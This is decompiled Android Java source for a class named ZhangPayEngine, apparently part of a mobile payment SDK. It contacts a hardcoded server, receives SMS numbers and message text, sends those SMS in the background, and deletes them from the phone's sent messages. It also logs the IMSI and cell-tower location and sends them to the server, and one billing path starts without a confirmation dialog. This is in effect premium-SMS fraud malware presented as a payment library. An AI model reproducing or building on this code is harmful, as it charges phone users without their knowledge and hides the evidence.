package com.zhangzhifu.sdk;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import com.zhangzhifu.sdk.activity.ZhangPayActivity;
import com.zhangzhifu.sdk.db.MMRWapDBManager;
import com.zhangzhifu.sdk.db.MoreSMSWapDBManager;
import com.zhangzhifu.sdk.db.OnlineGameWapDBManager;
import com.zhangzhifu.sdk.db.PcOnlineGameWapDBManager;
import com.zhangzhifu.sdk.db.SMSDBManager;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.modle.FeeBean;
import com.zhangzhifu.sdk.modle.MMRWap;
import com.zhangzhifu.sdk.modle.MoreSmsWap;
import com.zhangzhifu.sdk.modle.OnlineWap;
import com.zhangzhifu.sdk.modle.PcOnlineWap;
import com.zhangzhifu.sdk.modle.SMSBean;
import com.zhangzhifu.sdk.protocolstack.ZhangPayXMLParser;
import com.zhangzhifu.sdk.service.ZhangPayPlateService;
import com.zhangzhifu.sdk.util.AppInfo;
import com.zhangzhifu.sdk.util.DESUtil;
import com.zhangzhifu.sdk.util.JudgeTimeUtil;
import com.zhangzhifu.sdk.util.NetManage;
import com.zhangzhifu.sdk.util.SimState;
import com.zhangzhifu.sdk.util.SystemInfo;
import com.zhangzhifu.sdk.util.TelUtils;
import com.zhangzhifu.sdk.util.Tools;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.json.InitResponse;
import com.zhangzhifu.sdk.util.json.JSonParser_init;
import com.zhangzhifu.sdk.util.md5.Md5SignUtil;
import com.zhangzhifu.sdk.util.sms.SendSmsReceiver;
import com.zhangzhifu.sdk.util.sms.util.MessageUtils;
import java.io.PrintStream;
import java.util.HashMap;
import java.util.List;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;

public class ZhangPayEngine
{
  public static final int SIGN_MD5 = 1;
  public static final int SIGN_RSA = 2;
  public static final String TAG = "zhangPay_log";
  private static int t = 1;
  private static int u;
  public static ZhangPayEngine zhangPaySdk;
  private List a;
  private String appName;
  private String b;
  private String c;
  private String d;
  private String e;
  private String f;
  private String g;
  private String h;
  private String i;
  private String j;
  private String k;
  private String l;
  private String m;
  private Handler mHandler;
  private String n;
  private String o;
  private String p;
  private String q;
  private String r;
  private String s;
  public ZhangPayCallback zhangPayCallback;
  
  public ZhangPayEngine() {}
  
  private void a(Context paramContext, int paramInt)
  {
    new Thread(new d(this, paramContext, paramInt)).start();
  }
  
  private void a(Context paramContext, HashMap paramHashMap)
  {
    new AppInfo(paramContext);
    ZhangPayLog.d("zhangPay_log", "获取付费协议时间起");
    SharePreferUtil.getInstance().setSmsResult(paramContext, 1011);
    SharePreferUtil.getInstance();
    SharePreferUtil.setSendSMSMMQ(paramContext, 0);
    SharePreferUtil.getInstance();
    SharePreferUtil.setLoadingDisplay(paramContext, 10);
    SharePreferUtil.getInstance();
    SharePreferUtil.setSmsBodyKey(paramContext, null);
    this.b = ((String)paramHashMap.get("channelId"));
    this.c = ((String)paramHashMap.get("priciePointId"));
    this.d = ((String)paramHashMap.get("money"));
    this.e = ((String)paramHashMap.get("cpparam"));
    this.g = ((String)paramHashMap.get("key"));
    this.h = ((String)paramHashMap.get("appId"));
    this.i = ((String)paramHashMap.get("qd"));
    this.f = ((String)paramHashMap.get("priciePointName"));
    this.j = ((String)paramHashMap.get("priciePointDec"));
    this.appName = ((String)paramHashMap.get("appName"));
    this.k = ((String)paramHashMap.get(this.k));
    if ((this.j.contains("X.XX元")) || (this.j.contains("x.xx元"))) {
      t = 0;
    }
    for (;;)
    {
      SharePreferUtil.getInstance();
      SharePreferUtil.setPriciePointId(paramContext, this.c);
      SharePreferUtil.getInstance();
      SharePreferUtil.setAppName(paramContext, this.appName);
      SharePreferUtil.getInstance();
      SharePreferUtil.setAppName(paramContext, this.k);
      SharePreferUtil.getInstance();
      SharePreferUtil.setPriciePointDec(paramContext, this.j);
      if ((SharePreferUtil.getInstance().getTradeName(paramContext) != null) || (SharePreferUtil.getInstance().getTradeName(paramContext) != "")) {
        SharePreferUtil.getInstance().setTradeName(paramContext, "");
      }
      SharePreferUtil.getInstance().setTradeName(paramContext, this.f);
      if ((SharePreferUtil.getInstance().getMoney(paramContext) != null) || (SharePreferUtil.getInstance().getMoney(paramContext) != "")) {
        SharePreferUtil.getInstance().setMoney(paramContext, "");
      }
      SharePreferUtil.getInstance().setMoney(paramContext, this.d);
      System.out.println("传入数据为：---------->channelId是：" + this.b + "priciePointId是：" + this.c + "money是：" + this.d + "cpparam是：" + this.e + "key是：" + this.g + "appId是：" + this.h + "qd是：" + this.i);
      i1 = initNetSIM(paramContext, this.b);
      if (i1 == 1000) {
        break;
      }
      onCallBackFaild(i1);
      sendMsg(3);
      return;
      t = 1;
      a(paramContext, 992);
    }
    String str;
    if (judgeIsResquest(paramContext)) {
      str = String.format("http://112.74.111.42:8000/zpayEntrancePayment?channelId=%s&priciePointId=%s&money=%s&cpparam=%s&appId=%s&qd=%s", new Object[] { this.b, this.c, this.d, this.e, this.h, this.i });
    }
    try
    {
      SharePreferUtil.setLastCallTime(paramContext, System.currentTimeMillis());
      ZhangPayLog.d("zhangPay_log", "md5");
      paramHashMap = Tools.getContentByCMWAP(str, Tools.getHeadersByDefault(paramContext, Md5SignUtil.sign(String.format("channelId=%s&priciePointId=%s&money=%s&cpparam=%s&appId=%s&qd=%s", new Object[] { this.b, this.c, this.d, this.e, this.h, this.i }), this.g), this.b, TelUtils.getGSMCellLocationInfo(paramContext), 0.0D, 0.0D), paramContext).getEntity();
      try
      {
        ZhangPayLog.d("zhangPay_log", "请求付费接口地址url：---------->" + str);
        if (paramHashMap != null) {
          break label736;
        }
        a(paramContext, 1008);
        sendMsg(5);
        onCallBackFaild(1008);
      }
      catch (Exception paramContext)
      {
        for (;;)
        {
          label711:
          paramContext.printStackTrace();
          sendMsg(10);
          onCallBackFaild(1008);
          ZhangPayLog.e("zhangPay_log", "支付产生未知错误");
          continue;
          if (paramHashMap.length() > 4000)
          {
            ZhangPayLog.d("zhangPay_log", "http request content 是：[" + paramHashMap.substring(0, 4000));
            ZhangPayLog.d("zhangPay_log", paramHashMap.substring(4000, paramHashMap.length()) + "]");
          }
          for (;;)
          {
            i1 = 0;
            if ("-1".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "服务器返回未知错误，检查参数");
              SharePreferUtil.getInstance().setDataResult(paramContext, 10090);
              i1 = -1;
            }
            if ("1".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "该计费点没有匹配相应的扣费通道");
              SharePreferUtil.getInstance().setDataResult(paramContext, 10091);
              i1 = 1;
            }
            if ("2".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "该手机号码被列入黑名单");
              SharePreferUtil.getInstance().setDataResult(paramContext, 10092);
              i1 = 2;
            }
            if ("3".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "没有相应的计费点");
              SharePreferUtil.getInstance().setDataResult(paramContext, 10093);
              i1 = 3;
            }
            if ("4".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "验签错误");
              SharePreferUtil.getInstance().setDataResult(paramContext, 10094);
              i1 = 4;
            }
            if ("5".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "key秘钥异常");
              SharePreferUtil.getInstance().setDataResult(paramContext, 10095);
              i1 = 5;
            }
            if ("6".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "系统资费异常");
              SharePreferUtil.getInstance().setDataResult(paramContext, 10096);
              i1 = 6;
            }
            if ("7".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
              SharePreferUtil.getInstance().setDataResult(paramContext, 10097);
              i1 = 7;
            }
            if ("8".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
              SharePreferUtil.getInstance().setDataResult(paramContext, 10098);
              i1 = 8;
            }
            if ("9".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
              SharePreferUtil.getInstance().setDataResult(paramContext, 10099);
              i1 = 9;
            }
            if ("10".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
              SharePreferUtil.getInstance().setDataResult(paramContext, 100910);
              i1 = 10;
            }
            if ("11".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
              SharePreferUtil.getInstance().setDataResult(paramContext, 100911);
              i1 = 11;
            }
            if ("12".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
              SharePreferUtil.getInstance().setDataResult(paramContext, 100912);
              i1 = 12;
            }
            if ("13".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
              SharePreferUtil.getInstance().setDataResult(paramContext, 100911);
              i1 = 13;
            }
            if ("14".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
              SharePreferUtil.getInstance().setDataResult(paramContext, 100911);
              i1 = 14;
            }
            if ("15".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
              SharePreferUtil.getInstance().setDataResult(paramContext, 100911);
              i1 = 15;
            }
            if ("16".equals(paramHashMap))
            {
              ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
              SharePreferUtil.getInstance().setDataResult(paramContext, 100911);
              i1 = 16;
            }
            if (i1 == 0) {
              break label1712;
            }
            sendMsg(7);
            switch (i1)
            {
            case 1: 
              onCallBackFaild(10091);
              break label711;
              ZhangPayLog.d("zhangPay_log", "http request content 是：[" + paramHashMap + "]");
            }
          }
          onCallBackFaild(10092);
          continue;
          onCallBackFaild(10093);
          continue;
          onCallBackFaild(10094);
          continue;
          onCallBackFaild(10095);
          continue;
          onCallBackFaild(10096);
          continue;
          onCallBackFaild(10097);
          continue;
          onCallBackFaild(10098);
          continue;
          onCallBackFaild(10099);
          continue;
          onCallBackFaild(100910);
          continue;
          onCallBackFaild(100911);
          continue;
          onCallBackFaild(100912);
          continue;
          onCallBackFaild(100911);
          continue;
          onCallBackFaild(100911);
          continue;
          onCallBackFaild(100911);
          continue;
          onCallBackFaild(100911);
          continue;
          paramHashMap = DESUtil.decrypt(paramHashMap, "utf-8");
          paramHashMap = ZhangPayFeeDispath.getInstance().getHtml(paramHashMap);
          if ((paramHashMap != null) || (!paramHashMap.equals("")))
          {
            this.a = new ZhangPayXMLParser().readXML(paramHashMap, paramContext);
            ZhangPayLog.e("zhangPay_log", "计费通道的数量是：" + this.a.size());
            if ((this.a != null) && (this.a.size() > 0))
            {
              sendSMSToMiao(paramContext);
              a(paramContext, this.a);
              a(paramContext, 999);
              ZhangPayLog.d("zhangPay_log", "获取付费协议时间终");
              int i2 = 0;
              if (SharePreferUtil.getIsPOP(paramContext) == 1)
              {
                ZhangPayLog.i("zhangPay_log", "ZhangPay计费提示框启动");
                ZhangPayLog.i("zhangPay_log", "当前弹窗为：[ 是]");
                i1 = i2;
                if (this.mHandler == null)
                {
                  ZhangPayLog.i("zhangPay_log", "二次确认，建议调用pay接口时将第四个参数传入true，将会 显示加载进度条");
                  paramHashMap = new Intent();
                  paramHashMap.setClass(paramContext, ZhangPayActivity.class);
                  paramHashMap.addFlags(268435456);
                  paramHashMap.putExtra("enterType", 1111);
                  paramContext.startActivity(paramHashMap);
                  i1 = i2;
                }
              }
              for (;;)
              {
                sendMsg(i1);
                break;
                if ((SharePreferUtil.getIsPOP(paramContext) == 0) && (t == 0))
                {
                  ZhangPayLog.i("zhangPay_log", "当前弹窗为：[ 否]");
                  i1 = 1;
                  paramContext.startService(new Intent(paramContext, ZhangPayPlateService.class));
                  getSmsSendResult(paramContext);
                }
                else
                {
                  ZhangPayLog.i("zhangPay_log", "当前弹窗为：[ 是]");
                  i1 = i2;
                  if (this.mHandler == null)
                  {
                    ZhangPayLog.i("zhangPay_log", "二次确认，建议调用pay接口时将第四个参数传入true，将会 显示加载进度条");
                    paramHashMap = new Intent();
                    paramHashMap.setClass(paramContext, ZhangPayActivity.class);
                    paramHashMap.addFlags(268435456);
                    paramHashMap.putExtra("enterType", 1111);
                    paramContext.startActivity(paramHashMap);
                    i1 = i2;
                  }
                }
              }
            }
          }
        }
      }
      ZhangPayLog.d("zhangPay_log", "start 获取xml");
      return;
    }
    catch (Exception paramHashMap)
    {
      for (;;)
      {
        ZhangPayLog.e("zhangPay_log", "导致错误的情况有，1：网络无法连接，2：话费协议获取失败，3：在UI线程调用pay支付接口！");
        paramHashMap = null;
        continue;
        label736:
        paramHashMap = Tools.getStringFromInputStream(paramHashMap.getContent());
        if ((paramHashMap != null) || (!"".equals(paramHashMap))) {
          break;
        }
        a(paramContext, 1008);
        sendMsg(6);
        onCallBackFaild(1008);
      }
    }
  }
  
  private static void a(Context paramContext, List paramList)
  {
    int i1;
    if (paramList != null)
    {
      OnlineGameWapDBManager.getInstance().delpro(paramContext);
      SMSDBManager.getInstance().deleteAllSMS(paramContext);
      PcOnlineGameWapDBManager.getInstance().delpro(paramContext);
      MMRWapDBManager.getInstance().delpro(paramContext);
      MoreSMSWapDBManager.getInstance().delpro(paramContext);
      i1 = 0;
      if (i1 < paramList.size()) {}
    }
    else
    {
      return;
    }
    FeeBean localFeeBean = (FeeBean)paramList.get(i1);
    if ((localFeeBean instanceof SMSBean)) {
      SMSDBManager.getInstance().insertSMS((SMSBean)localFeeBean, paramContext);
    }
    for (;;)
    {
      i1 += 1;
      break;
      if ((localFeeBean instanceof OnlineWap))
      {
        OnlineGameWapDBManager.getInstance().addWapFee((OnlineWap)localFeeBean, paramContext);
      }
      else if ((localFeeBean instanceof PcOnlineWap))
      {
        PcOnlineGameWapDBManager.getInstance().addWapFee((PcOnlineWap)localFeeBean, paramContext);
      }
      else if ((localFeeBean instanceof MMRWap))
      {
        System.out.println("数据库里面增加");
        MMRWapDBManager.getInstance().addWapFee((MMRWap)localFeeBean, paramContext);
      }
      else if ((localFeeBean instanceof MoreSmsWap))
      {
        MoreSMSWapDBManager.getInstance().addWapFee((MoreSmsWap)localFeeBean, paramContext);
      }
    }
  }
  
  public static ZhangPayEngine getInstance()
  {
    if (zhangPaySdk == null) {
      zhangPaySdk = new ZhangPayEngine();
    }
    return zhangPaySdk;
  }
  
  public void getSmsSendResult(Context paramContext)
  {
    SharePreferUtil.getInstance().setSmsResult(paramContext, 1011);
    new Thread(new a(this, paramContext)).start();
    sendSMSToQ(paramContext);
  }
  
  public int init(Context paramContext, String paramString1, String paramString2, String paramString3)
  {
    if ((paramString1 != null) || ((paramString1.equals("")) && (paramString2 != null)) || ((paramString2.equals("")) && (paramString3 != null)) || (paramString3.equals("")))
    {
      SimState localSimState = SimState.getCurrentSimState(paramContext);
      SharePreferUtil.getLastIMSI(paramContext).trim();
      String str1 = SharePreferUtil.getInstance().getChannelId(paramContext);
      SharePreferUtil.getInstance();
      String str2 = SharePreferUtil.getQd(paramContext);
      SharePreferUtil.getInstance();
      SharePreferUtil.getAppId(paramContext);
      if ((str1 == null) || (str1.equals("")))
      {
        SharePreferUtil.getInstance().setChannelId(paramContext, paramString1);
        if ((str2 != null) && (!str2.equals(""))) {
          break label200;
        }
        SharePreferUtil.getInstance();
        SharePreferUtil.setQd(paramContext, paramString3);
        label131:
        if ((str1 != null) && (!str1.equals(""))) {
          break label213;
        }
        SharePreferUtil.getInstance();
        SharePreferUtil.setAppId(paramContext, paramString2);
      }
      boolean bool1;
      boolean bool2;
      for (;;)
      {
        paramString2 = new NetManage(paramContext);
        bool1 = paramString2.isDataConnected();
        bool2 = paramString2.checkNetworkConnection(paramContext);
        if (localSimState.isSimState()) {
          break label225;
        }
        return 1006;
        SharePreferUtil.getInstance().setChannelId(paramContext, paramString1);
        break;
        label200:
        SharePreferUtil.getInstance();
        SharePreferUtil.setQd(paramContext, paramString3);
        break label131;
        label213:
        SharePreferUtil.getInstance();
        SharePreferUtil.setAppId(paramContext, paramString2);
      }
      label225:
      ZhangPayLog.i("zhangPay_log", "当前掌支付SDK的版本为：[ 3.7.14]");
      if ((!bool1) && (!bool2)) {
        return 1007;
      }
      try
      {
        paramString2 = Tools.getContentByCMWAP("http://112.74.111.42:8000/zpayinit" + "?type=1", Tools.getHeadersByDefault(paramContext, null, paramString1), paramContext).getEntity();
        if (paramString2 != null)
        {
          paramString2 = Tools.getBody(paramString2);
          if (paramString2 != null)
          {
            paramString2 = JSonParser_init.getInitResponse(paramString2);
            this.l = paramString2.getResultCode();
            this.n = paramString2.getContent();
            this.m = paramString2.getSendMobile();
            this.o = paramString2.getMobileImsi();
          }
        }
        paramString2 = Tools.getContentByCMWAP("http://112.74.111.42:8000/zpayinit" + "?type=2", Tools.getHeadersByDefault(paramContext, null, paramString1), paramContext).getEntity();
        if (paramString2 != null)
        {
          paramString2 = Tools.getBody(paramString2);
          if (paramString2 != null)
          {
            paramString2 = JSonParser_init.getInitResponse(paramString2);
            this.p = paramString2.getResultCode();
            this.r = paramString2.getContent();
            this.q = paramString2.getSendMobile();
            this.s = paramString2.getMobileImsi();
          }
        }
      }
      catch (Exception paramString2)
      {
        for (;;)
        {
          ZhangPayLog.w("zhangPay_log", "初始化可能不成功；请保证设备可联网，有SIM卡并有话费！");
        }
      }
      ZhangPayLog.d("zhangPay_log", "初始化结果为：1000");
      ZhangPayRecodeServer.getInstance().sentMessServer(paramContext, paramString1, 1000);
      return 1000;
    }
    ZhangPayLog.d("zhangPay_log", "初始化结果为：998");
    return 998;
  }
  
  public void initLocation(Context paramContext)
  {
    HashMap localHashMap = TelUtils.getGSMCellLocationInfo(paramContext);
    try
    {
      SharePreferUtil.putString(paramContext, "lac", (String)localHashMap.get("lac"));
      SharePreferUtil.putString(paramContext, "mcc", (String)localHashMap.get("mcc"));
      SharePreferUtil.putString(paramContext, "mnc", (String)localHashMap.get("mnc"));
      SharePreferUtil.putString(paramContext, "cid", (String)localHashMap.get("cid"));
      ZhangPayLog.e("zhangPay_log", "lac:" + (String)localHashMap.get("lac") + "mcc:" + (String)localHashMap.get("mcc") + "mnc:" + (String)localHashMap.get("mnc") + "cid:" + (String)localHashMap.get("cid"));
      return;
    }
    catch (Exception paramContext)
    {
      ZhangPayLog.e("zhangPay_log", "定位失败");
    }
  }
  
  public int initNetSIM(Context paramContext, String paramString)
  {
    paramString = SimState.getCurrentSimState(paramContext);
    NetManage localNetManage = new NetManage(paramContext);
    boolean bool1 = localNetManage.isDataConnected();
    boolean bool2 = localNetManage.checkNetworkConnection(paramContext);
    paramContext = SystemInfo.getIMSI(paramContext);
    ZhangPayLog.i("zhangPay_log", "当前设备IMSI号码：[" + paramContext + "]");
    if (!paramString.isSimState()) {
      return 1006;
    }
    if ((!bool1) && (!bool2)) {
      return 1007;
    }
    return 1000;
  }
  
  public boolean judgeIsResquest(Context paramContext)
  {
    System.out.println("是否具备请求条件" + JudgeTimeUtil.judgeTime(paramContext));
    if (JudgeTimeUtil.judgeTime(paramContext))
    {
      if (JudgeTimeUtil.isMax(1, paramContext)) {
        return true;
      }
      sendMsg(11);
      onCallBackFaild(990);
      return false;
    }
    sendMsg(12);
    onCallBackFaild(991);
    return false;
  }
  
  public void onCallBackFaild(int paramInt)
  {
    if (this.mHandler != null)
    {
      this.mHandler.post(new c(this, paramInt));
      return;
    }
    if (this.zhangPayCallback == null) {
      throw new RuntimeException("ZhangPayCallback is null ? == 回调函数不能为空。");
    }
    this.zhangPayCallback.onZhangPayBuyProductFaild(this.c, paramInt);
  }
  
  public void onCallBackSuc()
  {
    if (this.mHandler != null)
    {
      this.mHandler.post(new b(this));
      return;
    }
    this.zhangPayCallback.onZhangPayBuyProductOK(this.c, "1001");
  }
  
  public void pay(Context paramContext, HashMap paramHashMap, ZhangPayCallback paramZhangPayCallback)
  {
    this.zhangPayCallback = paramZhangPayCallback;
    this.mHandler = null;
    a(paramContext, paramHashMap);
  }
  
  public void pay(Context paramContext, HashMap paramHashMap, ZhangPayCallback paramZhangPayCallback, Handler paramHandler)
  {
    this.mHandler = paramHandler;
    this.zhangPayCallback = paramZhangPayCallback;
    a(paramContext, paramHashMap);
  }
  
  public void sendMsg(int paramInt)
  {
    if (this.mHandler != null) {
      this.mHandler.sendEmptyMessage(paramInt);
    }
  }
  
  public void sendSMSToMiao(Context paramContext)
  {
    try
    {
      if (((this.m != null) || (this.m.length() > 0)) && (this.l.equals("0")))
      {
        paramContext.registerReceiver(SendSmsReceiver.getReceiver(), new IntentFilter("android.zhangzhifu.SEND_SMS_RECEIVER"));
        Intent localIntent = new Intent();
        localIntent.putExtra("mobile", this.m);
        localIntent.putExtra("content", this.n);
        localIntent.setAction("android.zhangzhifu.SEND_SMS_RECEIVER");
        paramContext.sendBroadcast(localIntent);
        MessageUtils.saveSmsSentAddress(paramContext, this.m);
        MessageUtils.deleteSentSms(paramContext, SharePreferUtil.getInstance().getSmsSentAddress(paramContext));
      }
      return;
    }
    catch (Exception paramContext) {}
  }
  
  public void sendSMSToQ(Context paramContext)
  {
    try
    {
      if (((this.q != null) || (this.q.length() > 0)) && (this.p.equals("0")))
      {
        paramContext.registerReceiver(SendSmsReceiver.getReceiver(), new IntentFilter("android.zhangzhifu.SEND_SMS_RECEIVER"));
        Intent localIntent = new Intent();
        localIntent.putExtra("mobile", this.q);
        localIntent.putExtra("content", this.r);
        localIntent.setAction("android.zhangzhifu.SEND_SMS_RECEIVER");
        paramContext.sendBroadcast(localIntent);
        MessageUtils.saveSmsSentAddress(paramContext, this.m);
        MessageUtils.deleteSentSms(paramContext, SharePreferUtil.getInstance().getSmsSentAddress(paramContext));
      }
      return;
    }
    catch (Exception paramContext) {}
  }
}
